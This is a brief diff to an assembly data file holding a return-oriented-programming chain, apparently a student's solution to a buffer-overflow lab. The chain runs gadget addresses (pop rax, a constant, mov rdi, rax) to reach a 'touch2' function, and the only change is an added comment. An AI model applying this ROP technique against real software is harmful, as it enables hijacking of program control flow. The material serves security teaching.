@@ -14,5 +14,5 @@ ret_addr:
     dq 4019ABh                  ; pop rax; nop; ret
     dq 59B997FAh                ;
     dq 4019A2h                  ; mov rdi, rax; ret
-    dq 4019ACh                  ; nop; ret
+    dq 4019ACh                  ; nop; ret ; useless
     dq 4017ECh                  ; touch2
